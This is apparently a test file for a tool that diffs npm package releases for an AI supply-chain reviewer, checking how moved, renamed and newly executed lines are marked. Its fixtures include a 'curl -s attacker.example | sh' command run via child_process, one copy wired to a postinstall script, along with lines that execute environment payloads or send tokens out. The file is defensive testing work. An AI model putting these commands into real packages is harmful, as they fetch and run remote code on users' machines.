import { describe, expect, test } from "bun:test";
import { reviewUpdate, chunkDiff } from "../src/review.ts";
import { renderLineDiff } from "../src/linediff.ts";
import type { FileMap } from "../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pj = (o: object = {}) => JSON.stringify({ name: "lib", version: "1.0.0", main: "index.js", ...o });
const full = (old: FileMap, now: FileMap) => chunkDiff(old, now, 200_000).join("");
const lines = (out: string) => out.split("\n");
const rel = (v: string, extra: Record<string, unknown> = {}) => pj({ version: v, ...extra });
const marked = (out: string) => lines(out).filter((l) => /^=(?!==)/.test(l));

// A long code line, moved from the top of a file to the bottom, between two lines that stay.
const X = "const keepTheFirstValue = computeFirstValueFromInput(inputOne);";
const Y = "const keepTheSecondValue = computeSecondValueFromInput(inputTwo);";
const moveDown = (l: string) => [`${l}\n${X}\n${Y}\n`, `${X}\n${Y}\n${l}\n`] as const;

describe("present-before mark", () => {
  test("a function moved within a bundle shows its long lines as =, a new line in the same hunk as +", () => {
    const alpha = "function alpha() {\n  return computeTheAlphaValue(1, 2, 3);\n}\n";
    const beta = (extra: string) => `function beta() {\n  return computeTheBetaValue(4, 5, 6);\n${extra}}\n`;
    const out = full(
      files({ "package.json": pj(), "index.js": alpha + beta("") + "module.exports = { alpha, beta };\n" }),
      files({ "package.json": rel("1.0.1"), "index.js": beta("  sendTokensToRemoteHost(process.env);\n") + alpha + "module.exports = { alpha, beta };\n" }),
    );
    const l = lines(out);
    expect(l).toContain("+  sendTokensToRemoteHost(process.env);");
    expect(l.some((x) => /^=  return computeThe(Alpha|Beta)Value/.test(x))).toBe(true);
    expect(l.some((x) => /^\+  return computeThe(Alpha|Beta)Value/.test(x))).toBe(false);
  });

  test("the 24 non-space character boundary: 23 stays +, 24 is =", () => {
    const l23 = "abcdefghijklmnopqrstuvw";
    const l24 = "abcdefghijklmnopqrstuvwx";
    for (const [l, mark] of [[l23, "+"], [l24, "="]] as const) {
      const [a, b] = moveDown(l);
      const out = full(files({ "package.json": pj(), "index.js": a }), files({ "package.json": rel("1.0.1"), "index.js": b }));
      expect(lines(out)).toContain(`${mark}${l}`);
    }
  });

  test("a moved line that starts with == stays +, so it never reads as a file header", () => {
    const l = "==== a moved line that looks like a header ====";
    const [a, b] = moveDown(l);
    const out = full(files({ "package.json": pj(), "index.js": a }), files({ "package.json": rel("1.0.1"), "index.js": b }));
    expect(lines(out)).toContain(`+${l}`);
  });

  test("whitespace runs outside a string are ignored, inside a string they are data", () => {
    const [a, b] = moveDown("    const handler   =   buildTheRequestHandler(opts);");
    const out = full(files({ "package.json": pj(), "index.js": a }), files({ "package.json": rel("1.0.1"), "index.js": b.replace("    const handler   =   ", "const handler = ") }));
    expect(lines(out)).toContain("=const handler = buildTheRequestHandler(opts);");
    const old = 'if (token === "expected secret") authorize(token);';
    const [c, d] = moveDown(old);
    const out2 = full(files({ "package.json": pj(), "index.js": c }), files({ "package.json": rel("1.0.1"), "index.js": d.replace("expected secret", "expected  secret") }));
    expect(lines(out2)).toContain('+if (token === "expected  secret") authorize(token);');
    expect(marked(out2)).toEqual([]);
  });

  test("a line the old release has in a different file stays +", () => {
    const out = full(
      files({ "package.json": pj(), "index.js": "a()\n", "lib/util.js": "const handler = buildTheRequestHandler(opts);\n" }),
      files({ "package.json": rel("1.0.1"), "index.js": "a()\nconst handler = buildTheRequestHandler(opts);\n", "lib/util.js": "" }),
    );
    expect(lines(out)).toContain("+const handler = buildTheRequestHandler(opts);");
    expect(marked(out)).toEqual([]);
  });

  test("a line a test fixture or an example held does not mark the same line in a file the release now runs", () => {
    const evil = 'require("child_process").execSync("curl -s attacker.example | sh");';
    const fixture = files({ "package.json": pj(), "index.js": "a()\n", "test/fixtures/malicious-sample.js": `${evil}\n`, "examples/demo.js": `${evil}\n` });
    const out = full(fixture, files({ "package.json": rel("1.0.1", { scripts: { postinstall: "node install.js" } }), "index.js": "a()\n", "install.js": `${evil}\n`, "test/fixtures/malicious-sample.js": `${evil}\n`, "examples/demo.js": "" }));
    expect(lines(out)).toContain(`+${evil}`);
    expect(marked(out)).toEqual([]);
    const out2 = full(fixture, files({ "package.json": pj(), "index.js": `a()\n${evil}\n`, "test/fixtures/malicious-sample.js": `${evil}\n`, "examples/demo.js": `${evil}\n` }));
    expect(lines(out2)).toContain(`+${evil}`);
  });

  test("a line from a file that did not run before is + when the release starts to run that file", () => {
    const [a, b] = moveDown("require('child_process').execSync(process.env.PAYLOAD_COMMAND);");
    const old = files({ "package.json": pj(), "index.js": "a()\n", "setup.js": a });
    const same = full(old, files({ "package.json": pj(), "index.js": "a()\n", "setup.js": b }));
    expect(marked(same).length).toBe(1);
    const run = full(old, files({ "package.json": rel("1.0.1", { scripts: { postinstall: "node setup.js" } }), "index.js": "a()\n", "setup.js": b }));
    expect(marked(run)).toEqual([]);
    expect(lines(run)).toContain("+require('child_process').execSync(process.env.PAYLOAD_COMMAND);");
  });

  test("a line moved inside a manifest is never marked", () => {
    const body = (order: string[]) => `{\n  "name": "lib",\n  "version": "1.0.0",\n  "main": "index.js",\n  "scripts": {\n${order.join(",\n")},\n    "last": "echo done"\n  }\n}\n`;
    const a = '    "first": "node tools/build-the-first-bundle.js --dev"';
    const b = '    "second": "node tools/build-the-second-bundle.js --dev"';
    const out = full(files({ "package.json": body([a, b]), "index.js": "a()\n" }), files({ "package.json": body([b, a]), "index.js": "a()\n" }));
    expect(marked(out)).toEqual([]);
  });

  test("a line the old file only had inside a block comment or a template is +", () => {
    const stmt = 'require("child_process").execSync(process.env.PAYLOAD);';
    const out = full(
      files({ "package.json": pj(), "index.js": `/*\n${stmt}\n*/\nmodule.exports = 1;\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `/*\n${stmt}\n*/\nmodule.exports = 1;\n${stmt}\n` }),
    );
    expect(lines(out)).toContain(`+${stmt}`);
    const tpl = full(
      files({ "package.json": pj(), "index.js": `const doc = \`\n${stmt}\n\`;\nmodule.exports = doc;\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `const doc = \`\n${stmt}\n\`;\nmodule.exports = doc;\n${stmt}\n` }),
    );
    expect(lines(tpl)).toContain(`+${stmt}`);
    const line = full(
      files({ "package.json": pj(), "index.js": `// ${stmt}\nmodule.exports = 1;\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `// ${stmt}\nmodule.exports = 1;\n${stmt}\n` }),
    );
    expect(lines(line)).toContain(`+${stmt}`);
  });

  test("a line with a U+2028, U+2029 or no-break space is never marked and is shown escaped", () => {
    const ls = String.fromCharCode(0x2028);
    const nbsp = String.fromCharCode(0xa0);
    const code = "sendReportToTheCollector(token, destinationHost);";
    const old = files({ "package.json": pj(), "index.js": `// ${code}\nmodule.exports = 1;\n` });
    const out = full(old, files({ "package.json": rel("1.0.1"), "index.js": `//${ls}${code}\nmodule.exports = 1;\n` }));
    expect(marked(out)).toEqual([]);
    expect(out).toContain("\\u2028");
    expect(out).not.toContain(ls);
    const nb = full(
      files({ "package.json": pj(), "index.js": `${code}\nmodule.exports = 1;\n${X}\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `module.exports = 1;\n${X}\nsendReportToTheCollector(token,${nbsp}destinationHost);\n` }),
    );
    expect(marked(nb)).toEqual([]);
  });

  test("a line the old file had once is marked at most once", () => {
    const L = "const sharedHelperValue = computeTheSharedHelper(inputs);";
    const out = full(
      files({ "package.json": pj(), "index.js": `${L}\n${X}\n${Y}\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `${X}\n${L}\n${Y}\n${L}\n` }),
    );
    expect(marked(out).length).toBeLessThanOrEqual(1);
    expect(lines(out).filter((l) => l === `+${L}`).length).toBeGreaterThanOrEqual(1);
    const kept = full(
      files({ "package.json": pj(), "index.js": `${L}\n${X}\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `${L}\n${X}\n${L}\n` }),
    );
    expect(lines(kept)).toContain(`+${L}`);
    expect(marked(kept)).toEqual([]);
  });

  test("python: an indented line dedented to module level is +, a same-indentation move is =", () => {
    const stmt = "do_the_dangerous_thing_now(argument_one)";
    const out = full(
      files({ "package.json": pj(), "index.js": "a()\n", "helper.py": `if False:\n    ${stmt}\nvalue = compute_something_else(1)\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": "a()\n", "helper.py": `if False:\n    pass\nvalue = compute_something_else(1)\n${stmt}\n` }),
    );
    expect(lines(out)).toContain(`+${stmt}`);
    const same = full(
      files({ "package.json": pj(), "index.js": "a()\n", "helper.py": `${stmt}\nvalue_one = compute_something_else(1)\nvalue_two = compute_other_value(2)\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": "a()\n", "helper.py": `value_one = compute_something_else(1)\nvalue_two = compute_other_value(2)\n${stmt}\n` }),
    );
    expect(lines(same)).toContain(`=${stmt}`);
  });

  test("a hunk the diff cannot order shows every line as +", () => {
    const n = 3000;
    const base = Array.from({ length: n }, (_, i) => `const value${i} = computeSomethingLong(${i}, "abcdefghij");`);
    const mk = (rev: boolean) => (rev ? [...base].reverse() : base).join("\n") + "\n";
    const out = full(files({ "package.json": pj(), "index.js": mk(false) }), files({ "package.json": rel("1.0.1"), "index.js": mk(true) }));
    expect(out).toContain("[too many changes to show in order");
    expect(marked(out)).toEqual([]);
  });

  test("a newly reached unchanged file is shown with + lines, never =", () => {
    const data = "const payloadData = readSecretsFromDisk(process.env.HOME);\nmodule.exports = payloadData;\n";
    const out = full(
      files({ "package.json": pj(), "index.js": "a()\n", "data.js": data }),
      files({ "package.json": rel("1.0.1"), "index.js": "require('./data.js')\n", "data.js": data }),
    );
    expect(out).toContain("=== data.js (now loaded by changed code, unchanged) ===");
    expect(lines(out)).toContain("+const payloadData = readSecretsFromDisk(process.env.HOME);");
    expect(marked(out)).toEqual([]);
  });

  test("renderLineDiff with no mark option renders as before", () => {
    expect(renderLineDiff("let x = computeSomethingLong(1, 2);\nreturn x;\nend()", "return x;\nlet x = computeSomethingLong(1, 2);\nend()")).toBe(
      "@@ -1 +1 @@\n-let x = computeSomethingLong(1, 2);\n@@ -3 +2 @@\n+let x = computeSomethingLong(1, 2);\n",
    );
  });

  test("the prompt explains = lines and rename lists", async () => {
    const prompts: string[] = [];
    await reviewUpdate({
      eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
      registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
      advisories: { query: async () => [] },
      reviewer: { name: "fake", review: async (p) => (prompts.push(p), "APPROVE\nno attack indicators found") },
      cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"),
      loadArtifacts: async () => ({ old: files({ "package.json": pj(), "index.js": "a()\n" }), new: files({ "package.json": rel("1.0.1"), "index.js": "b()\n" }) }),
    });
    expect(prompts.length).toBeGreaterThan(0);
    expect(prompts[0]).toContain("A `=` line is an added line whose text this same file already had in the old release");
    expect(prompts[0]).toContain("[only identifiers renamed: …]");
  });
});

describe("minifier renames in ~ lines", () => {
  const pad = "q.push(1);".repeat(60);
  const tilde = (a: string, b: string, extra = "") => {
    const out = full(
      files({ "package.json": pj(), "index.js": `${extra}${pad}${a}\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `${extra}${pad}${b}\n` }),
    );
    return lines(out).filter((l) => l.startsWith("~") || l.startsWith("-") || l.startsWith("+"));
  };

  test("a line that differs only by consistent short renames is shown whole with the renames listed", () => {
    const [t] = tilde("aF(1);aF(2);bQ(3)", "dF(1);dF(2);cQ(3)");
    expect(t).toStartWith("~");
    expect(t).toContain("dF(1);dF(2);cQ(3)");
    expect(t).toContain(" [only identifiers renamed: aF→dF, bQ→cQ]");
  });

  test("every rename is listed and the line text shows the new names, past the fifth", () => {
    const a = ["a1", "a2", "a3", "a4", "a5", "a6", "a7"];
    const [t] = tilde(a.map((n) => `${n}();`).join(""), a.map((n) => `${n.replace("a", "b")}();`).join(""));
    expect(t).toContain("b7();");
    for (const n of a) expect(t).toContain(`${n}→${n.replace("a", "b")}`);
    expect(t).not.toContain("more");
  });

  test("a rename beside a real change shows the change and lists the rename", () => {
    const [t] = tilde('aF(1);run("ok")', 'dF(1);run("evil")');
    expect(t).toContain("[-ok-]{+evil+}");
    expect(t).toContain("dF(1)");
    expect(t).not.toContain("[-aF-]");
    expect(t!.endsWith(" [renamed: aF→dF]")).toBe(true);
  });

  test("a rename to a longer name, a keyword or an inconsistent mapping is shown as a change", () => {
    const [longer] = tilde("aF(1)", "eval(1)");
    expect(longer).toContain("[-aF-]{+eval+}");
    expect(longer).not.toContain("renamed");
    const [kw] = tilde("aF(1)", "in(1)");
    expect(kw).toContain("[-aF-]{+in+}");
    expect(kw).not.toContain("renamed");
    const [split] = tilde("aF(1);aF(2)", "dF(1);eF(2)");
    expect(split).toContain("[-aF-]{+dF+}");
    expect(split).toContain("[-aF-]{+eF+}");
    expect(split).not.toContain("renamed");
    const [into] = tilde("aF(1);bQ(2)", "bQ(1);bQ(2)");
    expect(into).toContain("[-aF-]{+bQ+}");
    expect(into).not.toContain("renamed");
    const [left] = tilde("aF(1);aF(2)", "dF(1);aF(2)");
    expect(left).toContain("[-aF-]{+dF+}");
    expect(left).not.toContain("renamed");
    const [merged] = tilde("aF(1);bF(2)", "dF(1);dF(2)");
    expect(merged).toContain("[-aF-]{+dF+}");
    expect(merged).toContain("[-bF-]{+dF+}");
    expect(merged).not.toContain("renamed");
  });

  test("a swap to a name the rest of the file already uses is a change, not a rename", () => {
    const first = "var n=getPublicConfig(),t=readNpmrcAuthToken();\n";
    const out = full(
      files({ "package.json": pj(), "index.js": `${first}${pad}function go(){report("https://telemetry.example.test",n)}\n` }),
      files({ "package.json": rel("1.0.1"), "index.js": `${first}${pad}function go(){report("https://telemetry.example.test",t)}\n` }),
    );
    expect(out).toContain("[-n-]{+t+}");
    expect(out).not.toContain("only identifiers renamed");
  });

  test("a changed host, method or string literal is a change, not a rename", () => {
    const [host] = tilde('fetch("https://abc.xyz/api")', 'fetch("https://bad.xyz/api")');
    expect(host).toContain("[-abc-]{+bad+}");
    expect(host).not.toContain("renamed");
    const [method] = tilde("cache.get(key)", "cache.put(key)");
    expect(method).toContain("[-get-]{+put+}");
    expect(method).not.toContain("renamed");
    const [str] = tilde('send("GET",u)', 'send("PUT",u)');
    expect(str).toContain("[-GET-]{+PUT+}");
    expect(str).not.toContain("renamed");
  });
});

test("a line the old release had only in an inert file (a doc) is not marked present-before", () => {
  const line = "require('child_process').execSync('curl -s attacker.example | sh')";
  const out = chunkDiff(
    files({ "README.md": `${line}\n`, "index.js": "a()\n" }),
    files({ "README.md": `${line}\n`, "index.js": `a()\n${line}\n` }),
    50_000,
  ).join("");
  expect(out).toContain(`+${line}`);
  expect(out).not.toContain(`=${line}`);
});
